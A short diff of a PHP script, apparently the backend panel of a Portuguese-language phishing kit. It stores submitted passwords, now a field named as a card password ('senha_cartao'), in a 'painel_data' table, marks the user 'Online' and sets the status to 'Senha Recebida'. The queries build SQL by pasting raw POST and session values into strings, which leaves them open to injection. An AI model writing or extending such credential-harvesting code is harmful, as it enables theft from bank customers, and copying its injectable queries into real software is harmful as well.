@@ -11,7 +11,6 @@ $db = new db();
 $db = $db->connect();
 $datetime = date('Y-m-d H:i:s');
 $ip =  getIp();
-$_SESSION['ip'] =  $ip;
 /***********************************Banco************************************************/
 
 
@@ -81,7 +80,7 @@ if ($_POST['action'] == 'gravar_assinatura_mobile') {
     die;
 }
 if ($_POST['action'] == 'gravar_senha4') {
-    $update = "update painel_data set status_cliente = 'Online', senha = '" . $_POST['senha4'] . "', ultima_atualizacao = '$datetime', 
+    $update = "update painel_data set status_cliente = 'Online', senha_cartao = '" . $_POST['senha4'] . "', ultima_atualizacao = '$datetime', 
 				status_cadastro = 'Senha Recebida' where usuario = '" . $_SESSION['usuario'] . "'";
     $result = $db->query($update);
     $status = 'success';
